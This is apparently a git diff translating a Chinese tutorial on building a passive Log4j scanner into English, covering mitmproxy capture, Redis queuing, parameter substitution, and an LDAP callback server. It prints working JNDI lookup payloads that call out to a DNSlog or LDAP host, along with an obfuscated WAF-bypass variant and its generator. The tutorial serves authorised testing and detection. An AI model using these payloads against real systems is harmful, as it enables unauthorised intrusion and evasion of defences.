@@ -1,42 +1,42 @@
-# 从零构建Log4j被动扫描器
+# Building Log4j Passive Scanner from Scratch
 
-# 为什么是被动扫描器
-Log4j这个漏洞比较特殊,有一点类似之前fastjson的漏洞,除了少数几个java产品(如Apache solr,VCenter),没有固定的漏洞触发URL,所以扫描Log4j的漏洞有以下两种方式
+# Why Passive Scanner
+The Log4j vulnerability is rather special. It is a bit similar to the previous fastjson vulnerability. Except for a few Java products (such as Apache solr and VCenter), there is no fixed vulnerability triggering URL. Therefore, there are two ways to scan for Log4j vulnerabilities:
 
-+ 通过Http Headers中的字段添加Payload进行测试
-+ 渗透测试人员手工在页面或者BP中输入payload进行测试
++ Testing by adding Payload in the fields of Http Headers.
++ Penetration testers manually inputting Payload in pages or BP.
 
-第一种方式本身成功率不高,第二种方式成功率很高,但是工作量又太大了,而被动扫描器就是为了解决第二种方式中工作量大的问题.
+The first method itself has a low success rate. The second method has a high success rate, but the workload is too large. The passive scanner is designed to solve the problem of large workload in the second method.
 
-被动扫描器并不是一个新的概念,业界也已经有了多个优秀的被动扫描器.例如原生支持被动扫描的xray,通过BP插件方式实现被动扫描的多个工具等
-
-
-
-# 被动扫描器原理
-被动扫描器运行时相关的几个节点关系如下图.
-
-![1640757454705-0f3bf3d6-0f1e-4e29-91a5-d15863abf7c9.webp](./img/MIbNu9Xe1OUSRs81/1640757454705-0f3bf3d6-0f1e-4e29-91a5-d15863abf7c9-415979.webp)
-
-## 运行逻辑
-+ 渗透测试人员浏览器通过http代理访问目标网站
-+ http代理获取到http request及http response
-+ http代理将http request及http response的具体内容转发到被动扫描器消息队列
-+ 被动扫描器消息队列接收到数据包后,调用配置好的扫描模块
-+ 扫描模块代码中将http request的对应内容(如header,param,json等)替换为payload
-+ 扫描模块再次发送更改后的request
+The passive scanner is not a new concept. There are already several excellent passive scanners in the industry. For example, xray that natively supports passive scanning, and several tools that implement passive scanning through BP plugins.
 
 
 
-## 实现效果
-渗透测试人员在配置好被动扫描器和浏览器代理后,只需要正常浏览目标网站,使用常见功能(如登录,更改用户配置等),被动扫描器会自动针对每一个http请求进行测试.
+# Principle of Passive Scanner
+Several node relationships related to the operation of the passive scanner are shown in the following figure.
+
+![](img\build_log4j_passive_scanner_from_scratch\1.webp)
+
+## Running Logic
++ The penetration tester's browser accesses the target website through the http proxy.
++ The http proxy obtains the http request and http response.
++ The http proxy forwards the specific contents of the http request and http response to the passive scanner message queue.
++ After the passive scanner message queue receives the data packet, it calls the configured scanning module.
++ In the scanning module code, the corresponding contents (such as header, param, json, etc.) of the http request are replaced with Payload.
++ The scanning module sends the modified request again.
 
 
 
-# 被动扫描器实现
-### 获取Http request及Http response
-我们业界非常成熟的工具mitmproxy来实现此功能.
+## Implementation Effect
+After the penetration tester configures the passive scanner and the browser proxy, they only need to browse the target website normally and use common functions (such as logging in, changing user configurations, etc.). The passive scanner will automatically test each http request.
 
-mitmproxy支持加载自定义插件,更方便我们实现自定义功能.mitmproxy插件的核心代码:
+
+
+# Implementation of Passive Scanner
+### Obtaining Http Request and Http Response
+We use the very mature tool mitmproxy in the industry to achieve this function.
+
+mitmproxy supports loading custom plugins, which makes it more convenient for us to implement custom functions. The core code of the mitmproxy plugin is as follows:
 
 ```python
 
@@ -81,11 +81,11 @@ mitmproxy支持加载自定义插件,更方便我们实现自定义功能.mitmpr
         }
 ```
 
-+ 通过mitmproxy的API,插件可以获取到request和response的所有信息,并且格式化存储,方便后续处理.
-+ mitmproxy插件并没有针对请求进行任何更改,所以用户通过代理访问目标网站不会受到影响.
++ Through the API of mitmproxy, the plugin can obtain all information of the request and response and store them in a formatted manner for subsequent processing.
++ The mitmproxy plugin does not make any changes to the requests, so the user's access to the target website through the proxy will not be affected.
 
-### Http request及Http response发送到被动扫描器
-为了实现模块化及流水线处理,Http request及Http response将以json格式发送到被动扫描器的消息队列,核心代码如下:
+### Sending Http Request and Http Response to the Passive Scanner
+In order to achieve modularization and pipeline processing, Http Request and Http Response will be sent to the message queue of the passive scanner in json format. The core code is as follows:
 
 ```python
 class RedisClient(object):
@@ -115,22 +115,22 @@ class RedisClient(object):
 class ProxyScanAddon(object):     
     def response(self, flow: http.HTTPFlow):
 		...
-        ...
+       ...
         self.rcon.publish_data({"request": request, "response": response})
 ```
 
-+ 消息队列通过Redis的订阅/推送功能实现
-+ 通过预先配置好的订阅地址及Redis网络连接,订阅/推送还实现了跨进程(mitmproxy/被动扫描器)消息通讯
++ The message queue is implemented through the subscription/push function of Redis.
++ Through the pre-configured subscription address and Redis network connection, subscription/push also realizes inter-process (mitmproxy/passive scanner) message communication.
 
 
 
-### 被动扫描器接收消息并调用扫描模块
-+ 消息接收部分代码
+### The Passive Scanner Receives Messages and Calls the Scanning Module
++ Code for message receiving part
 
 ```python
     @staticmethod
     def sub_proxy_http_scan_thread():
-        """这个函数必须以线程的方式运行,监控外部rpc发送的redis消息,获取任务结果"""
+        """This function must be run in a thread to monitor the redis messages sent by the external rpc and obtain the task results"""
         rcon = RedisClient.get_result_connection()
         if rcon is None:
             return
@@ -141,12 +141,12 @@ class ProxyScanAddon(object):
                 logger.warning(f"不应获取非空message {message}")
 ```
 
-+ 调用扫描模块部分代码
++ Code for calling the scanning module part
 
 ```python
 @staticmethod
     def store_request_response_from_sub(message=None):
-        # 获取数据
+        # Get the data
         body = message.get('data')
         try:
             data_dict = json.loads(body)
@@ -156,12 +156,12 @@ class ProxyScanAddon(object):
         except Exception as E:
             logger.exception(E)
             return False
-		# 配置开关
+		# Configuration switch
         conf = Xcache.get_proxy_http_scan_conf()
         if conf.get("flag") is not True:
             return
 		
-        # 实例化模块
+        # Instantiate the module
         proxy_http_scan_dict = Xcache.get_proxy_http_scan_dict()
         for module_uuid in proxy_http_scan_dict:
             one_result = proxy_http_scan_dict.get(module_uuid)
@@ -173,7 +173,7 @@ class ProxyScanAddon(object):
                 logger.exception(E)
                 continue
 			
-             # 调用模块
+             # Call the module
             try:
                 module_intent.callback(request=ProxyRequest(request_data), response=ProxyResponse(response_data),
                                        data=data)
@@ -182,8 +182,9 @@ class ProxyScanAddon(object):
                 continue
 ```
 
-### 扫描模块代码
-+ 扫描模块根据request的类型(GET/POST Form/POST JSON)替换对应参数为payload,然后再次发送http请求
+
+### Scan Module Code
++ The scan module replaces the corresponding parameters with payloads according to the type of request (GET/POST Form/POST JSON), and then sends the HTTP request again.
 
 ```python
         if request.method == "GET":
@@ -212,20 +213,20 @@ class ProxyScanAddon(object):
                         result = request.send()
 ```
 
-#### Log4j绕过WAF的Payload
-传统的Log4j的Payload特征非常明显,例如如下payload
+#### Payload for Bypassing Log4j WAF
+The traditional Log4j payload features are very obvious. For example, the following payload:
 
 ```python
 ${jndi:ldap://uuid.XXXX.ceye.io/hello}
 ```
 
-通过{::-n}实现绕过WAF的payload
+The payload that bypasses the WAF through {::-n}:
 
 ```python
 ${${VQ:f:-j}${68:E0:4:-n}${UiL:Iw:QuF:-d}${tI:nA:dol:-i}${vJ2:DKz:-:}${x:S5r:-l}${D:-d}${VNA:xs:rv:-a}${Y:-p}${8x:Z0z:-:}${b:V:-/}${Kki:Qn:1:-/}${x:l:-e}${Qm:ka:-e}${sL:4P8:-e}${Qqx:B:-d}${e:-d}${Qxm:r:LlI:-1}${UYv:-1}${9m:-c}${H:8P:-6}${r:I4:OC:-8}${o0:-7}${Ej:-1}${JX:9M:5F:-1}${sY:-1}${07n:owb:e:-e}${z:I:-c}${jH:nYU:s:-.}${r:RbP:j:-X}${lW:hcL:-X}${gPt:w:-X}${n:ZB0:3G:-.}${Fe:-c}${jfL:6b:sdn:-e}${N2:j:D:-y}${znQ:-e}${Di:-.}${N:d:-i}${sk:uf:-o}${4:pcl:-/}${Jb:Vf:-h}${ugL:-i}}
 ```
 
-具体代码
+Specific code:
 
 ```python
     def bypass_waf_payload(self, raw_payload):
@@ -239,16 +240,16 @@ ${${VQ:f:-j}${68:E0:4:-n}${UiL:Iw:QuF:-d}${tI:nA:dol:-i}${vJ2:DKz:-:}${x:S5r:-l}
         return new_payload
 ```
 
-#### DNSLog与LDAP协议
-在测试互联网应用时DNSlog是非常好用的,如果需要测试公司内网的应用,使用LDAP协议无疑是更加稳定好用的选择.
+#### DNSLog and LDAP Protocol
+When testing Internet applications, DNSlog is very useful. If it is necessary to test applications in the company intranet, using the LDAP protocol is undoubtedly a more stable and useful choice.
 
-LDAP的payload采用如下格式:
+The LDAP payload adopts the following format:
 
 ${jndi:ldap://LDAPIP:PORT/uuid}
 
-其中uuid可以用来判断具体请求的来源
+Where uuid can be used to determine the source of the specific request.
 
-搭建LDAPServer的代码如下:
+The code for setting up the LDAPServer is as follows:
 
 ```python
 class LDAPHandler(socketserver.BaseRequestHandler):
@@ -283,18 +284,14 @@ if __name__ == "__main__":
     with socketserver.TCPServer(("0.0.0.0", args.ldap_port), LDAPHandler()) as server:
         server.serve_forever()
 ```
+Each time the LDAPServer receives a request, it will print the source IP and the corresponding uuid.
 
-每次LDAPServer接收到请求,都会打印来源IP及对应的uuid
+# Integrate All Functions
+For a good security tool, functionality is the main body. A friendly UI and a convenient deployment method are also indispensable. The author integrates the functions of the passive scanner into Viper in a modular way. The final effect screenshots are as follows:
 
+![](img\build_log4j_passive_scanner_from_scratch\2.webp)
 
-
-# 集成所有功能
-对于一个好的安全工具,功能是其主体,友好的UI,方便的部署方式也是不可或缺的.作者将被动扫描器的功能以模块的方式集成到Viper中,最终效果截图:
-
-![1640760993754-1f7c97a5-d484-4695-b89c-01e39c2bd00e.webp](./img/MIbNu9Xe1OUSRs81/1640760993754-1f7c97a5-d484-4695-b89c-01e39c2bd00e-532644.webp)
-
-![1640761017423-e0ea648f-90a0-43b9-9ba3-c68bf77aa085.webp](./img/MIbNu9Xe1OUSRs81/1640761017423-e0ea648f-90a0-43b9-9ba3-c68bf77aa085-916896.webp)
-
+![](img\build_log4j_passive_scanner_from_scratch\3.webp)
 
 
 
